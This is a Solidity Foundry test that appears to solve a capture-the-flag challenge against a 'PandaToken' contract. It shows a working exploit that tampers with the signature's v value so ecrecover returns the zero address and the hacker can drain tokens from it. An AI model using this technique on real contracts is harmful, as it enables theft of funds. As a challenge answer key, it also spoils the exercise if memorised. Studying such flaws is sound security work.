// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/PandaToken.sol";

contract Hack is Test {
    PandaToken pandatoken;
    address owner = vm.addr(1);
    address hacker = vm.addr(2);

    function setUp() external {
        vm.prank(owner);
        pandatoken = new PandaToken(400, "PandaToken", "PND");
    }

    function test() public {
        vm.startPrank(hacker);
        bytes32 hash = keccak256(abi.encode(hacker, 1 ether));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(1, hash);

        // your goal - to have 3 tokens (3e18) on your own(hacker) balance.
        // solution
        /* maliciousV is used to force an error in ecrecover, making it return address(0), which has 10 PND */
        for (uint8 maliciousV = v - 1; pandatoken.balanceOf(hacker) != 3 ether; --maliciousV) {
            bytes memory signature = abi.encode(r, s, maliciousV);
            pandatoken.getTokens(1 ether, signature);    
        }

        vm.stopPrank();

        assertEq(pandatoken.balanceOf(hacker), 3 ether);
    }
}